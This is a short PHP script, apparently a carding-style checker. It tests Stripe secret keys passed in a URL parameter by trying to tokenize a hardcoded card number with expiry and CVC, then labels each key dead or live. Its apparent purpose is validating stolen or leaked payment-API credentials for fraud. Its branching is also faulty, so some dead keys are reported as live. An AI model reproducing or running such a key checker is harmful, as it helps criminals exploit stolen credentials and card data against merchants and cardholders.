<?php



$lista = $_GET['lista'];
$sk = "$lista";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5278540001668044&card[exp_month]=10&card[exp_year]=2024&card[cvc]=252");
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);

if ((strpos($result, 'You did not provide an API key.'))){
 echo '<br><span class="badge badge-danger">Dead ✗ </span> : ' . $sk . ' ➜ Dead Sk Key </br>';
}

if ((strpos($result, 'api_key_expired'))){
 echo '<br><span class="badge badge-danger">Dead ✗ </span> : ' . $sk . ' ➜ Dead Sk Key </br>';
}

if ((strpos($result, 'testmode_charges_only'))){
 echo '<br><span class="badge badge-danger">Dead ✗ </span> : ' . $sk . ' ➜ Dead Sk Key </br>';
}

if ((strpos($result, 'Invalid API Key provided'))){
 echo '<br><span class="badge badge-danger">Dead ✗ </span> : ' . $sk . ' ➜ Dead Sk Key </br>';
}

else {
 echo '<br><span class="badge badge-success">Live ✓ </span> : ' . $lista . ' ✅LIVE API KEY </br>';
}



?>